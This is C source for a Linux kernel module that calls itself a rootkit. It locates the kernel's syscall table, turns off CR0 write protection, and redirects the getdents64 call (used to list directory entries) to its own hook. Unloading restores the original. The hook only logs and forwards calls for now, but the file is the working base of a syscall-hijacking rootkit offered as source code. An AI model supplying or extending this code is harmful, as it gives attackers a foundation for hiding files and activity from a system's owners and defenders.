#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/types.h>
#include <asm/uaccess.h>
#include <asm/cacheflush.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");

static unsigned long ** p_sys_call_table;

asmlinkage int (*original_getdents64)(const struct pt_regs * pt_regs);
asmlinkage int (*test_getdents64)(const struct pt_regs * pt_regs);


asmlinkage int hooked_getdents64(const struct pt_regs * pt_regs)
{
    printk(KERN_INFO "[+] rootkit successfull hook!\n");

    return (*original_getdents64) (pt_regs);
}

unsigned int orig_cr0;

static void disable_wp_protection(void)
{
    unsigned long value;
    asm volatile ("mov %%cr0, %0":"=r" (value));

    if (!(value & 0x00010000))
        return;

    asm volatile ("mov %0, %%cr0"::"r" (value & ~0x00010000));
}

static void enable_wp_protection(void)
{
    unsigned long value;
    asm volatile ("mov %%cr0, %0":"=r" (value));

    if ((value & 0x00010000))
        return;

    asm volatile ("mov %0, %%cr0"::"r" (value | 0x00010000));
}

int set_page_rw(unsigned long addr){
    printk(KERN_INFO "[+] rootkit settin the page to rw\n");
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte->pte &~ _PAGE_RW)
    {
        pte->pte |= _PAGE_RW;
        printk(KERN_INFO "[+] rootkit set the page to rw\n");
        return 0;
    }
    return 1;
}

int set_page_ro(unsigned long addr) {
    printk(KERN_INFO "[+] rootkit settin the page to ro\n");
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
    printk(KERN_INFO "[+] rootkit set the page to ro\n");
    return 0;
}

static int __init init_rootkit(void) {
    printk(KERN_INFO "[+] rootkit init_rootkit\n");
    //Find the sys_call_table pointer in the kernel, you can check in /proc/kallsyms if its the same pointer.
    p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
    if (0 == p_sys_call_table)
    {
        printk(KERN_INFO "[!] rootkit Error Finding sys_call_table\n");
        return 1;
    }
    printk(KERN_INFO "[+] rootkit p_sys_call_table = %p\n", p_sys_call_table);

    // Try to find the original getdents64 pointer.
    original_getdents64 = (void *)p_sys_call_table[__NR_getdents64];
    if (0 == original_getdents64)
    {
        printk(KERN_INFO "[-] rootkit Error finding the original_getdents64\n");
        return 1;
    }
    printk(KERN_INFO "[+] rootkit original_getdents64 = %p\n", original_getdents64);

    // Change the sys_call_table pointer to out pointer.
    disable_wp_protection();
    printk(KERN_INFO "[+] rootkit setting the getdents64 pointer to out pointer. out ptr: %p\n", hooked_getdents64);
    p_sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    enable_wp_protection();

    test_getdents64 = (void *)p_sys_call_table[__NR_getdents64];
    if (0 == test_getdents64)
    {
        printk(KERN_INFO "[-] rootkit Error finding the test_getdents64\n");
        return 1;
    }
    printk(KERN_INFO "[+] rootkit test_getdents64 = %p\n", test_getdents64);


    return 0;
}

static void __exit exit_rootkit(void) {
    printk(KERN_INFO "[+] rootkit exit_rootkit\n");
    disable_wp_protection();
    p_sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    enable_wp_protection();

    return;
}

module_init(init_rootkit);
module_exit(exit_rootkit);